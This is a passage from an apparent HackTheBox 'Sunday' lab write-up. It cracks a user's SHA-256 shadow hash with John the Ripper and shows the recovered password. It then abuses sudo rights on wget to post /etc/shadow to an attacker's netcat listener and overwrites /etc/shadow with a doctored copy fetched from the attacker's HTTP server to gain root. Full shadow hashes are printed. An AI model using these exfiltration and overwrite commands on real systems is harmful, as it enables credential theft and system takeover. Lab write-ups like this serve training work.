openldap:*LK*::::::: 
webservd:*LK*::::::: 
postgres:NP::::::: 
svctag:*LK*:6445:::::: 
nobody:*LK*:6445:::::: 
noaccess:*LK*:6445:::::: 
nobody4:*LK*:6445:::::: 
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: 
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

## now let's try to crack sammy password using john the ripper tool

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Result

```
Using default input encoding: UTF-8 
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x]) 
Cost 1 (iteration count) is 5000 for all loaded hashes 
Will run 8 OpenMP threads 
Press 'q' or Ctrl-C to abort, almost any other key for status 
cooldude!        (sammy) 
1g 0:00:00:40 DONE (2022-04-07 18:23) 0.02483g/s 5085p/s 5085c/s 5085C/s ing456..bluenote 
Use the "--show" option to display all of the cracked passwords reliably 
Session completed
```

## now let's switch to user sammy . after running sudo -l we found wget program we can run as sudo. we can use post-file option method to send the contents of any file for example  /etc/shadow file.

## we execute the following command to post shadow file content on our local listening machine.

```
sudo wget --post-file=/etc/shadow {ip:port}
```

![nc](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Sunday/nc.png)

## now in other terminal where netcat listner is activated, you get the content.

```
nc -nvlp 8000
```

## with the help of below image you can observe that we have obtained the hash value , now we can save this shadow file content to other file name as shadow in our local machine and the replace sunny hash with root hash. 

### SHADOW CONTENT WE GOT IN NETCAT 

```
root:$5$rounds=10000$fIoXFZ5A$k7PlwsiH0wAyVOcKaAYl/Mo1Iq6XYfJlFXs58aA4Sr3:18969::::::263424 
daemon:NP:6445:::::: 
bin:NP:6445:::::: 
sys:NP:6445:::::: 
adm:NP:6445:::::: 
dladm:*LK*:17760:::::: 
netadm:*LK*:17760:::::: 
netcfg:*LK*:17760:::::: 
dhcpserv:*LK*:17760:::::: 
ftp:*LK*:17760:::::: 
sshd:*LK*:17760:::::: 
smmsp:NP:17760:::::: 
aiuser:*LK*:17760:::::: 
ikeuser:*LK*:17760:::::: 
lp:NP:6445:::::: 
openldap:NP:17760:::::: 
webservd:*LK*:17760:::::: 
unknown:*LK*:17760:::::: 
pkg5srv:NP:17760:::::: 
nobody:*LK*:17760:::::: 
noaccess:*LK*:6445:::::: 
nobody4:*LK*:6445:::::: 
sammy:$5$rounds=10000$lUpW4prM$aKFJxjI7vlcj5DDvwIgYGy707a84mIEi0ZQK3XIDqT2:18980:::::: 
sunny:$5$rounds=10000$bioFdRBN$1TTdfQFfhjNicxWhH07f8BIHABZ8di01CXWYTT5rMn9:18980::::::2526309
```

### AFTER REPLACING SUNNY HASH TO ROOT 

```
root:$5$rounds=10000$bioFdRBN$1TTdfQFfhjNicxWhH07f8BIHABZ8di01CXWYTT5rMn9:18969::::::263424 
daemon:NP:6445:::::: 
bin:NP:6445:::::: 
sys:NP:6445:::::: 
adm:NP:6445:::::: 
dladm:*LK*:17760:::::: 
netadm:*LK*:17760:::::: 
netcfg:*LK*:17760:::::: 
dhcpserv:*LK*:17760:::::: 
ftp:*LK*:17760:::::: 
sshd:*LK*:17760:::::: 
smmsp:NP:17760:::::: 
aiuser:*LK*:17760:::::: 
ikeuser:*LK*:17760:::::: 
lp:NP:6445:::::: 
openldap:NP:17760:::::: 
webservd:*LK*:17760:::::: 
unknown:*LK*:17760:::::: 
pkg5srv:NP:17760:::::: 
nobody:*LK*:17760:::::: 
noaccess:*LK*:6445:::::: 
nobody4:*LK*:6445:::::: 
sammy:$5$rounds=10000$lUpW4prM$aKFJxjI7vlcj5DDvwIgYGy707a84mIEi0ZQK3XIDqT2:18980:::::: 
sunny:$5$rounds=10000$fIoXFZ5A$k7PlwsiH0wAyVOcKaAYl/Mo1Iq6XYfJlFXs58aA4Sr3:18980::::::2526309
```


## now replace this file from orginal file on the sammy user for doing this open python http server and then use below command

```
sudo wget http://ip:port/shadow -O /etc/shadow
```

## now root password become sunday not acess to root user using su root .

![root](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Sunday/root.png)
